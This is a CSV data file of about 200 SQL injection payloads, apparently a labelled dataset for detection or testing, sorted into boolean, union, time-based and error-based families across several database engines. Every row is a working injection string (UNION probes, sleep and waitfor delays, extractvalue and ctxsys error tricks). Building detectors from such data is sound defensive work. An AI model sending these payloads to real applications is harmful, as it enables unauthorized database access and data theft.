source_line,family,payload
6143,boolean,"1""   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   ""ffcf"" like ""ffcf"
6144,union,"-1490'||  (  select 'uzbm' from dual where 3181  =  3181 union all select 3181,3181,3181,3181,3181--"
6145,union,"1""  )   where 5794  =  5794 union all select null,null,null,null,null,null,null,null,null,null#"
6146,boolean,1 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) 
6147,other,"1""  )   as vqkz where 8536  =  8536"
6148,boolean,-4363%'   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  '%'  =  '
6149,boolean,"1'   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   'sied'  =  'sied"
6150,union,"-5891  )   where 5792  =  5792 union all select 5792,5792,5792,5792,5792#"
6151,boolean,"1'  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  "
6152,time,"1%""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  ""%""  =  """
6153,time,1'||  (  select 'xglm' from dual where 3556  =  3556 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
6154,time,"1""   )    )    and sleep  (  5  )   and    (    (   ""timv""  =  ""timv"
6155,union,"-7544""   )    )    union all select 3808,3808,3808,3808--"
6156,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--"
6157,time,waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta
6158,boolean,"1 where 5859  =  5859 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --"
6159,other,"1""  )   where 2445  =  2445"
6160,boolean,end and 'icny' like 'icny
6161,other,1 where 4940  =  4940
6162,boolean,"1""  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""kkim""  =  ""kkim"
6163,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and 'lgat' like 'lgat"
6164,error,"1%""  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  ""%""  =  """
6165,boolean,1   )    )    as ztcn where 1043  =  1043 and 6305  =  5785--
6166,time,"1""   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --"
6167,union,"-9389' where 5713  =  5713 union all select 5713,5713,5713,5713,5713,5713,5713,5713--"
6168,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   ""qkat""  =  ""qkat"
6169,error,"1""  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  ""ponv""  =  ""ponv"
6170,union,"1 union all select null,null,null,null,null,null,null,null,null,null#"
6171,other,select   (  case when   (  5914  =  2314  )   then 5914 else 1/  (  select 0  )   end  )  --
6172,union,"1""  )   union all select null,null--"
6173,time,"1""   )    )     )   or sleep  (  5  )   and    (    (     (  ""hdis"" like ""hdis"
6174,boolean,"1'  )   as woka where 4316  =  4316 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --"
6175,union,"1'  )   union all select null,null--"
6176,boolean,1' where 6359  =  6359 and   (  3020  =  3020  )  *6703--
6177,error,-2733'   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  'btjx'  =  'btjx
6178,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  '%'  =  '"
6179,other,1'  )   where 8118  =  8118
6180,boolean,"1%'   )    )    and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --"
6181,boolean,"1   )    )    as npdl where 5796  =  5796 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --"
6182,boolean,"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  "
6183,other,"iif  (  9007  =  3836,1,1/0  )  "
6184,other,"select * from generate_series  (  7237,7237,case when   (  7237  =  9757  )   then 1 else 0 end  )   limit 1--"
6185,boolean,1'  )   where 1369  =  1369 and 4840  =  1697#
6186,boolean,1 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  # odvp
6187,other,1 where 4245  =  4245
6188,other,1   )    )    as xlww where 5844  =  5844
6189,error,select   (  case when   (  5704  =  4125  )   then 5704 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--
6190,time,1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #
6191,other,"1%""  )   order by 1--"
6192,union,"1 union all select null,null,null,null,null,null,null,null,null#"
6193,boolean,"1""  )   where 8953  =  8953 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --"
6194,error,"1' in boolean mode  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   #"
6195,boolean,"-1737' or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'fsmd'  =  'fsmd"
6196,union,"1'+  (  select lang where 4191  =  4191 union all select null,null#"
6197,union,1%'   )    )    union all select null--
6198,boolean,end and    (    (     (  '%'  =  '
6199,other,1'||  (  select 'ifts' from dual where 6329  =  6329
6200,union,"1'   )    )    as nuku where 7009  =  7009 union all select null,null,null,null,null#"
6201,other,"select * from generate_series  (  3180,3180,case when   (  3180  =  4445  )   then 1 else 0 end  )   limit 1--"
6202,union,"1   )    )    union all select null,null,null,null,null,null#"
6203,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'boud'  =  'boud"
6204,time,"1  )   where 2020  =  2020 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #"
6205,boolean,"-1203""   )    )    or 8571  =  8571--"
6206,boolean,"1"" or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  "
6207,boolean,"1%"" or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and ""%""  =  """
6208,boolean,"1' in boolean mode  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   #"
6209,boolean,"1'   )    )    as sojl where 8710  =  8710 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --"
6210,other,1  )   order by 1#
6211,boolean,"-3349' or elt  (  6610  =  4379,4379  )   and 'poqm' like 'poqm"
6212,boolean,"1' in boolean mode  )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --"
6213,time,"1 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #"
6214,time,"1%'  )   or elt  (  5873  =  5873,sleep  (  5   )    )   #"
6215,boolean,"1'  )   where 5317  =  5317 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --"
6216,other,1  )   where 2170  =  2170
6217,union,"-1015""   )    )    union all select 6624,6624#"
6218,boolean,"1""   )    )     )   rlike   (  select   (  case when   (  6915  =  4531  )   then 1 else 0x28 end   )    )    and    (    (     (  ""jzzu""  =  ""jzzu"
6219,error,"-9505'   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'qhdg'  =  'qhdg"
6220,time,"1""   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   ""iuxs"" like ""iuxs"
6221,other,if  (  6554  =  1534  )   select 6554 else drop function buqb--
6222,error,"1""  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  ""pdsy"" like ""pdsy"
6223,time,"1'   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   'jfwt' like 'jfwt"
6224,boolean,"1'   )    )    or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   'esma' like 'esma"
6225,boolean,"1 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  -- bqxe"
6226,boolean,"-4327"" or make_set  (  3107  =  1781,1781  )   and ""lclf"" like ""lclf"
6227,boolean,1'  )   where 8575  =  8575 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --
6228,other,"1""  )   where 4112  =  4112"
6229,union,"-1487""  )   as crfi where 2407  =  2407 union all select 2407,2407,2407,2407,2407,2407,2407,2407,2407,2407--"
6230,error,"1""   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   ""umst""  =  ""umst"
6231,union,"1""   )    )    union all select null,null,null,null,null,null,null,null--"
6232,boolean,1'   )    )    as dqdv where 8126  =  8126 and 4595  =  4595#
6233,boolean,"1%""  )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --"
6234,other,"1""  )   where 1300  =  1300 order by 1#"
6235,union,"-5691' union all select 6610,6610#"
6236,error,-1854'  )   as fmmq where 7326  =  7326 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --
6237,boolean,"1""  )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --"
6238,error,select   (  case when   (  1743  =  5698  )   then 1743 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--
6239,other,"1""   )    )    as aamh where 7432  =  7432   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --"
6240,boolean,"1 where 4319  =  4319 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --"
6241,boolean,"1'   )    )    as vqrt where 5173  =  5173 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --"
6242,boolean,1'||  (  select 'hshf' where 9073  =  9073 and 7533  =  7533  )  ||'
6243,boolean,-4289' or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'agnc' like 'agnc
6244,boolean,"1' in boolean mode  )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --"
6245,boolean,-2165' where 6593  =  6593 or 9158  =  7254--
6246,union,"1'||  (  select 'ybfo' from dual where 3319  =  3319 union all select null,null,null,null,null,null,null,null#"
6247,other,"select * from generate_series  (  1488,1488,case when   (  1488  =  1685  )   then 1 else 0 end  )   limit 1--"
6248,error,"1%"" or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and ""%""  =  """
6249,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#"
6250,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  ""cwat"" like ""cwat"
6251,union,"1' where 6721  =  6721 union all select null,null,null,null,null,null,null,null,null,null#"
6252,boolean,"-6681""  )   or 5251  =  1162"
6253,other,"1"" where 9756  =  9756"
6254,boolean,"1"" and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --"
6255,error,"1  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  "
6256,boolean,"1 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  -- ctdx"
6257,union,"-2849' union all select 6491,6491,6491,6491,6491,6491,6491--"
6258,other,"1""  )   where 7514  =  7514"
6259,time,"1%""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""%""  =  """
6260,boolean,"1'   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'gmbd'  =  'gmbd"
6261,other,"1,  (  select   (  case when   (  8392  =  8404  )   then 1 else 8392*  (  select 8392 from information_schema.character_sets  )   end   )    )   "
6262,boolean,"1'   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   'ykoz'  =  'ykoz"
6263,other,1'||  (  select 'yydv' from dual where 9639  =  9639
6264,time,1' where 5455  =  5455 and sleep  (  5  )  --
6265,boolean,1  )   where 5944  =  5944 and   (  4446  =  8843  )  *8843--
6266,union,"-2007%'   )    )    union all select 7298,7298,7298#"
6267,boolean,"1' where 4880  =  4880 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --"
6268,other,1'+  (  select ankx where 6789  =  6789
6269,other,select   (  case when   (  9388  =  4322  )   then 1 else 9388*  (  select 9388 from master..sysdatabases  )   end  )  --
6270,error,"1'   )    )    as sxpk where 5524  =  5524 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --"
6271,time,"select sleep  (  5  )   and ""jvys"" like ""jvys"
6272,union,"-6086"" union all select 8700,8700,8700,8700--"
6273,boolean,"-1366' or make_set  (  9354  =  9354,7185  )   and 'abre'  =  'abre"
6274,boolean,"1 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  "
6275,union,"1 where 2292  =  2292 union all select null,null,null,null#"
6276,error,select   (  case when   (  2768  =  8868  )   then 2768 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--
6277,boolean,"1 and elt  (  8853  =  1675,1675  )  -- jegm"
6278,boolean,1'   )    )    as stnn where 6160  =  6160 and 8881  =  7347--
6279,other,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3#"
6280,other,1' where 9381  =  9381
6281,time,1   )    )    as skex where 7941  =  7941 and sleep  (  5  )  --
6282,time,"1"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #"
6283,union,1  )   as uhmm where 2304  =  2304 union all select null#
6284,union,"-1150'  )   as hdby where 4032  =  4032 union all select 4032,4032,4032,4032,4032,4032,4032,4032,4032,4032--"
6285,other,"1%""   )    )    order by 1#"
6286,boolean,"1""  )   as jrse where 9185  =  9185 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --"
6287,time,"1   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   8024  =  8024"
6288,time,"select pg_sleep  (  5  )   and    (    (     (  ""wqeb""  =  ""wqeb"
6289,boolean,1'||  (  select 'tzxr' from dual where 2934  =  2934 and 4595  =  4595#
6290,boolean,"1""  )   where 4849  =  4849 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --"
6291,time,"1"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  "
6292,boolean,"-3649""   )    )    as eydu where 3220  =  3220 or elt  (  8705  =  1510,1510  )  --"
6293,union,"1"" where 1203  =  1203 union all select null,null,null--"
6294,time,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #"
6295,boolean,"1'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  'lfhx'  =  'lfhx"
6296,boolean,1'+  (  select 'qbdh' where 4006  =  4006 and 7533  =  7533  )  +'
6297,error,"1  )   as zhvx where 3171  =  3171 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --"
6298,time,1'  )   waitfor delay '0:0:5'
6299,union,"1%""   )    )    union all select null,null,null,null#"
6300,boolean,"-4945 or make_set  (  9354  =  9354,7185  )  "
6301,boolean,"1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --"
6302,error,"1%'   )    )    and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   '%'  =  '"
6303,other,1'  )   where 4003  =  4003
6304,error,"1"" where 9632  =  9632 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --"
6305,boolean,"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'nwdk' like 'nwdk"
6306,other,1'+  (  select 'upmd' where 3438  =  3438
6307,union,"-2384%'   )    )    union all select 2467,2467,2467,2467#"
6308,union,"1""   )    )    union all select null,null,null,null,null#"
6309,boolean,1  )   and 5196  =  9002
6310,time,1'+  (  select 'gmpn' where 8137  =  8137 or sleep  (  5   )    )   +'
6311,boolean,-4713'   )    )     )   or 4567  =  1287
6312,other,1'+  (  select xwcl where 7997  =  7997
6313,time,"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""qcqx"" like ""qcqx"
6314,union,"-5657'   )    )     )   union all select 8071,8071,8071,8071,8071,8071,8071,8071#"
6315,time,"1%""   )    )    and sleep  (  5  )  #"
6316,other,1'+  (  select 'ggkm' where 3394  =  3394
6317,boolean,"-6095""   )    )    as kgfp where 3601  =  3601 or 7287  =  9373#"
6318,error,"1'||  (  select 'ysij' from dual where 6140  =  6140 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1   )    )   ||'"
6319,boolean,"-8550""  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""kyad""  =  ""kyad"
6320,union,"1' in boolean mode  )   union all select null,null,null,null#"
6321,union,"-1559 union all select 3985,3985,3985,3985#"
6322,other,1  )   where 6090  =  6090
6323,boolean,"1  )   and make_set  (  8403  =  8403,8899  )   and   (  9761  =  9761"
6324,boolean,"1' or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'ptou'  =  'ptou"
6325,union,"-5934' union all select 6096,6096,6096,6096,6096#"
6326,union,"1%""   )    )     )   union all select null,null,null,null,null,null,null,null,null--"
6327,boolean,"1' and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --"
6328,boolean,"1""   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""sajl""  =  ""sajl"
6329,boolean,"1'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'cogf' like 'cogf"
6330,time,"1""   )    )    as jgie where 8017  =  8017 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --"
6331,time,1' waitfor delay '0:0:5' and 'dtej' like 'dtej
6332,boolean,"1"" and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""hvwv""  =  ""hvwv"
6333,error,"-9987   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  2114  =  2114"
6334,boolean,"-2982' or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'iqwn'  =  'iqwn"
6335,union,"1' union all select null,null,null,null,null,null,null,null,null--"
6336,other,select   (  case when   (  8642  =  6049  )   then 1 else 8642*  (  select 8642 from master..sysdatabases  )   end  )  --
6337,boolean,1 where 1636  =  1636 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --
6338,boolean,1'||  (  select 'flbv' where 7451  =  7451 and 4595  =  4595#
6339,boolean,"1%'  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  '%'  =  '"
6340,error,"-1678"" where 3706  =  3706 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --"
6341,boolean,"1""   )    )    and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""mzhk""  =  ""mzhk"
6342,time," select sleep  (  5  )   and    (    (   ""rthl"" like ""rthl"
